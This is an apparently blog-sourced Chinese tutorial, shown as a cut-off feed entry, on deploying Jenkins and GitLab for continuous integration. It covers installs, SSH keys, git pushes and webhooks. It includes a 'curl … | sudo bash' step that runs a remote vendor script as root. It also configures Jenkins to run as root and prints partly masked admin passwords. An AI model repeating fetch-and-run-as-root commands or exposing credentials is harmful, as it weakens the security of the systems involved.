    
    
    <categories>
      
      <category>CICD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CICD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jenkins+gitlab持续集成</title>
    <link href="/2025/04/18/Jenkins-gitlab%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"/>
    <url>/2025/04/18/Jenkins-gitlab%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/</url>
    
    <content type="html"><![CDATA[<p> 之前我们已经部署了k8s和harbor仓库，本次来部署下jenkins和gitlab实现持续集成。</p><p><strong>概念</strong></p><p>持续集成是开发团队通过将代码的不同部分集成到共享存储库中，并频繁地进行构建和测试，以确保代码的一致性和稳定性。</p><p><strong>流程</strong><br> 在现在的开发模式中，一般的项目，协同开发是离不开的，这就涉及到多个开发人员编写处理自己负责的功能模块或者某些开发人员共同负责一个模块。于是，通过版本控制系统可以将各个开发人员的代码集成在该共享存储库里，在存储库里，每个开发人员根据需求的不同来创建对应的分支，在完成需求后，每个人都需要提交合并将开发分支代码集成在一起，这就需要解决代码冲突，并且如何除了code review之外如何确保这些更改对应用没有产生影响，一旦提交请求合并到主分支，自动化构建工具就会根据流程自动编译构建安装应用，并执行单元测试框架的自动化测试来校验提交的修改。</p><h2 id="机器规划如下"><a href="#机器规划如下" class="headerlink" title="机器规划如下"></a>机器规划如下</h2><table><thead><tr><th>服务器名称</th><th>IP地址</th><th>配置</th></tr></thead><tbody><tr><td>jenkins211</td><td>10.0.0.211</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>gitlab212</td><td>10.0.0.212</td><td>4核，4GiB，系统盘 20GiB</td></tr></tbody></table><h2 id="一、部署jenkins"><a href="#一、部署jenkins" class="headerlink" title="一、部署jenkins"></a>一、部署jenkins</h2><p><strong>1.下载jenkins</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mirrors.jenkins-ci.org/debian/<br></code></pre></td></tr></table></figure><p><strong>2.准备jenkins部署环境</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 部署Jenkins的秘钥<br>[root@jenkins211 ~]# <span class="hljs-built_in">sudo</span> wget -O /usr/share/keyrings/jenkins-keyring.asc \<br>    https://pkg.jenkins.io/debian/jenkins.io-2023.key<br><br>2 添加Jenkins的存储库<br>[root@jenkins211 ~]# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [signed-by=/usr/share/keyrings/jenkins-keyring.asc]&quot;</span> \<br>    https://pkg.jenkins.io/debian binary/ | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> \<br>    /etc/apt/sources.list.d/jenkins.list &gt; /dev/null<br><br>3 安装JRE环境(在线安装很慢，一般提前下载好jdk)<br>[root@jenkins211 ~]# <span class="hljs-built_in">sudo</span> apt-get update<br>  <span class="hljs-built_in">sudo</span> apt-get install fontconfig openjdk-17-jre<br>  <span class="hljs-built_in">sudo</span> apt-get install jenkins  <br><br>4 创建jdk安装目录，解压到指定目录<br>[root@jenkins211 ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares<br>[root@jenkins211 ~]# tar xf jdk-17_linux-x64_bin.tar.gz -C /softwares/<br><br><br>5 配置jdk环境变量<br>[root@jenkins211 ~]# vim .bashrc<br>...<br><span class="hljs-built_in">export</span> JAVA_HOME=/softwares/jdk-17.0.8<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br><br>[root@jenkins211 ~]# <span class="hljs-built_in">source</span> .bashrc <br><br>6 验证jdk是否生效<br>[root@jenkins211 ~]# java --version<br>openjdk 17.0.13 2024-10-15<br>OpenJDK Runtime Environment (build 17.0.13+11-Ubuntu-2ubuntu122.04)<br>OpenJDK 64-Bit Server VM (build 17.0.13+11-Ubuntu-2ubuntu122.04, mixed mode, sharing)<br></code></pre></td></tr></table></figure><p><strong>3.部署jenkins</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">安装jenkins<br>[root@jenkins211 ~]# dpkg -i jenkins_2.489_all.deb <br><span class="hljs-comment"># apt-get install jenkins #这种在线方式安装较慢，不建议。</span><br><br>修改jenkins的启动脚本并重启服务<br>[root@jenkins211 ~]# vim /lib/systemd/system/jenkins.service<br>......<br>User=root<br>Group=root<br><br>...<br>Environment=<span class="hljs-string">&quot;JENKINS_HOME=/var/lib/jenkins&quot;</span><br><span class="hljs-comment"># 找到上面一行后添加如下一行</span><br>Environment=<span class="hljs-string">&quot;JAVA_HOME=/oldboyedu/softwares/jdk-17.0.8&quot;</span><br></code></pre></td></tr></table></figure><p><strong>4.访问jenkins地址</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.0.0.211:8080/login?from=%2F<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e1515ec05a604141a51fb41866f3b4f8.png" alt="img"><br><strong>5.查看密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@jenkins211 ~]# <span class="hljs-built_in">cat</span> /var/lib/jenkins/secrets/initialAdminPassword<br>88259fc092c34ded983b6917872****d<br></code></pre></td></tr></table></figure><p><strong>6.安装jenkins插件</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fb5658f33a674aaf8f16a7198b9da4e5.png" alt="img"><strong>7.创建用户</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/105460e20071422b84d3861c09145a54.png" alt="img"><strong>好啦，就这样jenkins就简简单单部署完成了</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5c919d64bb60497db248332c7ba4d376.png" alt="img"></p><p>8.修改时区</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@jenkins211</span> <span class="hljs-operator">~</span>]# ln <span class="hljs-operator">-</span>svf <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zoneinfo/</span><span class="hljs-type">Asia</span><span class="hljs-regexp">/Shanghai /</span>etc<span class="hljs-operator">/</span>localtime<br>&#x27;<span class="hljs-regexp">/etc/</span>localtime&#x27; -&gt; &#x27;<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zoneinfo/</span><span class="hljs-type">Asia</span><span class="hljs-operator">/</span><span class="hljs-type">Shanghai</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b6d8f708686a4daf973f86a9fb8c4fcc.png" alt="img"></p><p>9.修改jenkins软件源</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@jenkins211</span> <span class="hljs-operator">~</span>]# sed <span class="hljs-operator">-</span>i.bak &#x27;s#updates.jenkins.io<span class="hljs-regexp">/download#mirror.tuna.tsinghua.edu.cn/</span>jenkins#g&#x27; <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/jenkins/</span>updates<span class="hljs-operator">/</span><span class="hljs-keyword">default</span>.json<br></code></pre></td></tr></table></figure><p>10.修改搜索引擎</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">[root<span class="hljs-meta">@jenkins</span>211 ~]# sed -i <span class="hljs-string">&#x27;s#www.google.com#www.baidu.com#g&#x27;</span> /<span class="hljs-keyword">var</span>/lib/jenkins/updates/<span class="hljs-keyword">default</span>.json<br></code></pre></td></tr></table></figure><p>11.替换jenkins国内下载地址</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2e48d1b82ed74ec0971cfbdf1214a888.png" alt="img"></p><p> 拉到最下面替换url</p><blockquote><p>将升级站点URL替换成国内镜像地址<br> <a href="https://mirror.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json">https://mirror.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json</a></p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9ae3dd35c62e4146a54b59671f70bf2d.png" alt="img"></h2><p>12.重新登录jenkins</p><blockquote><p><a href="http://10.0.0.211:8080/restart">http://10.0.0.211:8080/restart</a></p></blockquote><h2 id="二、部署gitlab"><a href="#二、部署gitlab" class="headerlink" title="二、部署gitlab"></a>二、部署gitlab</h2><p>参考地址：<a href="https://about.gitlab.com/install/#ubuntu">https://about.gitlab.com/install/#ubuntu</a></p><ol><li>安装并配置必要的依赖项</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install -y curl openssh-server ca-certificates tzdata perl<br></code></pre></td></tr></table></figure><p>2.安装 Postfix</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install -y postfix<br></code></pre></td></tr></table></figure><p>3.添加 GitLab 包仓库并安装包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.deb.sh | <span class="hljs-built_in">sudo</span> bash<br></code></pre></td></tr></table></figure><p>4.安装 GitLab 包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#url替换成自己本机的ip地址</span><br>EXTERNAL_URL=<span class="hljs-string">&quot;http://10.0.0.212&quot;</span> apt-get install gitlab-ee<br><br><span class="hljs-comment">#也可以选择离线部署</span><br>https://packages.gitlab.com/gitlab/gitlab-ce<br></code></pre></td></tr></table></figure><p>5.查看密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@gitlab212 ~]# <span class="hljs-built_in">cat</span> /etc/gitlab/initial_root_password<br>....<br>Password: 8Et747zZeK0xKnx4gJ03HP+5MQ00yv4v3rzjy1a***=<br>....<br></code></pre></td></tr></table></figure><p>6.登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">账号：root<br>密码：查看生成的密码<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a7d21a5248714edf8437ae6646f79ff3.png" alt="img"></p><p>7.设置语言</p><p>点击偏好设置</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ea6267f5b46a4537a65173d42916acad.png" alt="img"></p><p>选择中文–&gt;保存</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2c004cf24a564d328fea29af1008bd8a.png" alt="img">8.开启本地网络请求</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/aaf8e8f036024678a602c833150fc730.png" alt="img"></p><h2 id="三、gitlab集成jenkins"><a href="#三、gitlab集成jenkins" class="headerlink" title="三、gitlab集成jenkins"></a>三、gitlab集成jenkins</h2><p>1.创建群组</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9d9589fef0c24fde925ab1874fbd4a99.png" alt="img"></p><p>2.新建项目</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9fda0fb6a0e74337b433cc67a415c1ef.png" alt="img"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/81ea81153b4a47d985cb4f2d7c31835a.png" alt="img"></p><p>3.添加ssh密钥</p><p>服务器和代码仓库连接方式有两种</p><p>第一种: 基于用户名和密码的方式连接</p><p>第二种: 基于SSH免秘钥方式(和命令行的SSH免秘钥相同)</p><p>我们使用基于免秘钥方式: 方便+安全性高</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># ssh-keygen     #生成密钥对</span><br>Generating public/private ed25519 key pair.<br>Enter file in which to save the key (/root/.ssh/id_ed25519): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_ed25519<br>Your public key has been saved in /root/.ssh/id_ed25519.pub<br>The key fingerprint is:<br>SHA256:GMd0qYCfisI7YgnL9gaTOvhSg9VWYVOtJ/ZmClhYCPc root<span class="hljs-meta">@gitlab212</span><br>The key&#x27;s randomart image is:<br>+--[ED25519 256]--+<br>|<span class="hljs-string">  ...o+oo...     </span>|<br>|<span class="hljs-string">   .oo++ .o      </span>|<br>|<span class="hljs-string">   . =Eooo       </span>|<br>|<span class="hljs-string">  . + ++= .      </span>|<br>|<span class="hljs-string">.o.o +..S+       </span>|<br>|<span class="hljs-string">+=+ o .   +      </span>|<br>|<span class="hljs-string">=+=.   . +       </span>|<br>|<span class="hljs-string">BB .    .        </span>|<br>|<span class="hljs-string">++=.             </span>|<br>+----[SHA256]-----+<br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># </span><br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># ll .ssh/</span><br>total 16<br>drwx------ 2 root root 4096 Dec 17 07:57 ./<br>drwx------ 4 root root 4096 Dec 15 12:01 ../<br>-rw------- 1 root root    0 Jul 23 16:40 authorized_keys<br>-rw------- 1 root root  411 Dec 17 07:57 id_ed25519        <span class="hljs-comment">#私钥</span><br>-rw-r--r-- 1 root root   96 Dec 17 07:57 id_ed25519.pub    <span class="hljs-comment">#公钥</span><br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># cat .ssh/id_rsa.pub </span><br>cat: .ssh/id_rsa.pub: No such file or directory<br>[root<span class="hljs-meta">@gitlab212</span> ~]<span class="hljs-comment"># cat .ssh/id_ed25519.pub</span><br>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILkNNA0/prl380e574O6+cfOSOAbpeJl+zhEdS5e58 root<span class="hljs-meta">@gitlab212</span><br></code></pre></td></tr></table></figure><p> 4.将公钥贴近gitlab</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e5a3ce30996d414287f7cf26d27d9e9c.png" alt="img"></p><p>添加公钥</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/20fd10f4b6214e02937eeb464ae75025.png" alt="img">4.推送代码</p><p>配置邮箱</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--local</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;liangjh&quot;</span><br>git config <span class="hljs-attr">--local</span> user<span class="hljs-selector-class">.email</span> <span class="hljs-string">&quot;3101306637@qq.com&quot;</span><br></code></pre></td></tr></table></figure><p>创建仓库</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment">#上传代码到服务器</span><br>[root@gitlab212 project]<span class="hljs-comment"># pwd</span><br>/root/project<br>[root@gitlab212 project]<span class="hljs-comment"># ll</span><br>total 228<br>drwxr-xr-x<span class="hljs-number"> 6 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>08:09 ./<br>drwx------<span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>08:06 ../<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16458 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>about.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20149 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>album.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 19662 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>article_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18767 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>article.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18913 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>comment.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16465 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>contact.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 19 </span><span class="hljs-number"> 2022 </span>css/<br>drwxr-xr-x<span class="hljs-number"> 7 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>08:07 .git/<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 19 </span><span class="hljs-number"> 2022 </span>images/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 29627 </span>Jun<span class="hljs-number"> 29 </span><span class="hljs-number"> 2019 </span>index.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 19 </span><span class="hljs-number"> 2022 </span>js/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 24893 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>product_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20672 </span>Jun<span class="hljs-number"> 13 </span><span class="hljs-number"> 2019 </span>product.html<br><br><br>git clone git@10.0.0.212:ops/project.git<br>cd project<br>git switch --create main<br><br><span class="hljs-comment">#提交全部代码到缓存区</span><br>[root@gitlab212 project]<span class="hljs-comment"># git add .    </span><br><br><span class="hljs-comment">#提交到远程仓库</span><br>[root@gitlab212 project]<span class="hljs-comment"># git commit -m &quot;第一次提交&quot;</span><br><br><span class="hljs-comment">#查看分支</span><br>[root@gitlab212 project]<span class="hljs-comment"># git branch</span><br><br><span class="hljs-comment">#推送到master分支</span><br>[root@gitlab212 project]<span class="hljs-comment"># git push -u origin master</span><br></code></pre></td></tr></table></figure><p>5.gitlab查看</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1d5f28d411084e1e9bd09a9e30a5c7ab.png" alt="img"></p><h2 id="四、配置jenkins和gitlab免密"><a href="#四、配置jenkins和gitlab免密" class="headerlink" title="四、配置jenkins和gitlab免密"></a>四、配置jenkins和gitlab免密</h2><p>1.jenkins生成密钥对</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">[root<span class="hljs-meta">@jenkins211</span> ~]<span class="hljs-comment"># ssh-keygen</span><br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/root/.ssh/id_rsa): <br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /root/.ssh/id_rsa<br>Your public key has been saved in /root/.ssh/id_rsa.pub<br>The key fingerprint is:<br>SHA256:8f0e/2XSZCdAGULp+LEkvVjeFo7YVJWv7HDFQDzfi1I root<span class="hljs-meta">@jenkins211</span><br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|<span class="hljs-string">         .o.o*o. </span>|<br>|<span class="hljs-string">          .oo =  </span>|<br>|<span class="hljs-string">        .+ ..  *.</span>|<br>|<span class="hljs-string">        ooB..E  *</span>|<br>|<span class="hljs-string">        S@.Boooo=</span>|<br>|<span class="hljs-string">        o B.=o+*.</span>|<br>|<span class="hljs-string">           ..++ +</span>|<br>|<span class="hljs-string">             ..=.</span>|<br>|<span class="hljs-string">              . +</span>|<br>+----[SHA256]-----+<br>[root<span class="hljs-meta">@jenkins211</span> ~]<span class="hljs-comment"># </span><br>[root<span class="hljs-meta">@jenkins211</span> ~]<span class="hljs-comment"># cat .ssh/id_rsa.pub </span><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrTMTf0oqtW7GktgZBdhqkjCBp2xGCcGeEo8ZcEKaN352TDMGKRI5O+0gAwUBj9HMAkPASJsejtTQIrT5jkBuW/8L5RXPDqCCyuzz1nkW/rPiyVvuAvvkQxFMBxL4w/AoDAhcsxpV73DCyYTrjQ8Tj7PfSViEUKZFpPbtroOZeCgCVa/mNPj7hGI2xUapKd0rdiGpXlDMPlD1uN9TET1WTj157QbYbgtsA6y+K2hjG97HHta0miovC4vqbaKQuohbYThbkwE5v6Ndjg8WSYjXEO6SDgemR6/c/JIyMPv1rNUitzl6dg4jykJ2pCTsemvFL7Vdjypbn9l0bPK8cq+mz0W8ZKLd2Ijqshj67SFWjFxJs0/yabg3jdMTdnYxRYdiG2vaMlAmtgGbXAUGXMqCzXNftmSpyqlSxGhfKLUC76LCqc4nBhqt2reN3L5yd/rzVZENdpok8cdV/dZag8ibzlgeqOL60ONThYTPZTACyw+U2K2HhqLmoCVDpYxU= root<span class="hljs-meta">@jenkins211</span><br></code></pre></td></tr></table></figure><p> 2.<strong>将公钥加入到gitlab</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d151e8f5f16c4650bd5a2135dfc61e60.png" alt="img"></p><p>3.拉取测试</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 随便拉一个位置测试就行</span><br>[root<span class="hljs-symbol">@jenkins211</span> ~]<span class="hljs-meta"># git clone git@10.0.0.212:ops/project.git</span><br></code></pre></td></tr></table></figure><h2 id="五、-jenkins推送代码到gitlab"><a href="#五、-jenkins推送代码到gitlab" class="headerlink" title="五、 jenkins推送代码到gitlab"></a>五、 jenkins推送代码到gitlab</h2><p>1.jenkins创建项目</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3bb3f56c2bbd4ab0a4d33b70589d33a6.png" alt="img"></p><p>2.填写git地址<img src="https://gitee.com/ljh00928/csdn/raw/master/img/9cd693ded1bf4da29b08b1ddab163628.png" alt="img"></p><p> 3.jenkins构建</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6caece5f65ef4edf9405091af52edf45.png" alt="img"></p><blockquote><p> 构建完成之后，代码会拉取到jenkins工作目录中，在日志中查看工作目录的位置</p></blockquote><p> <img src="https://gitee.com/ljh00928/csdn/raw/master/img/860ce7b0d00f4b28b93dc091057d0fde.png" alt="img"></p><p> 服务器查看，代码已经成功拉取到jenkins工作目录。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@jenkins211 test]<span class="hljs-comment"># pwd</span><br>/var/lib/jenkins/workspace/test<br>[root@jenkins211 test]<span class="hljs-comment"># ll</span><br>total 228<br>drwxr-xr-x<span class="hljs-number"> 6 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 ./<br>drwxr-xr-x<span class="hljs-number"> 3 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 ../<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16458 </span>Dec<span class="hljs-number"> 17 </span>17:22 about.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20149 </span>Dec<span class="hljs-number"> 17 </span>17:22 album.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 19662 </span>Dec<span class="hljs-number"> 17 </span>17:22 article_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18767 </span>Dec<span class="hljs-number"> 17 </span>17:22 article.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18913 </span>Dec<span class="hljs-number"> 17 </span>17:22 comment.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16465 </span>Dec<span class="hljs-number"> 17 </span>17:22 contact.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 css/<br>drwxr-xr-x<span class="hljs-number"> 8 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 .git/<br>drwxr-xr-x<span class="hljs-number"> 5 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 images/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 29627 </span>Dec<span class="hljs-number"> 17 </span>17:22 index.html<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Dec<span class="hljs-number"> 17 </span>17:22 js/<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 24893 </span>Dec<span class="hljs-number"> 17 </span>17:22 product_detail.html<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 20672 </span>Dec<span class="hljs-number"> 17 </span>17:22 product.html<br></code></pre></td></tr></table></figure><p>4.配置webhook</p><p>jenkins需要安装gitlab插件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/52f75e68a66f45c98744132684c782c7.png" alt="img"></p><p> 勾选插件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d1ffaa4591104bc0b6c840b5420990ce.png" alt="img"></p><p> jenkins生成令牌</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/58cc8d038daa445dbc23612a4e0bc49b.png" alt="img"></p><p> gitlab添加令牌，填写jenkins url</p><p><img 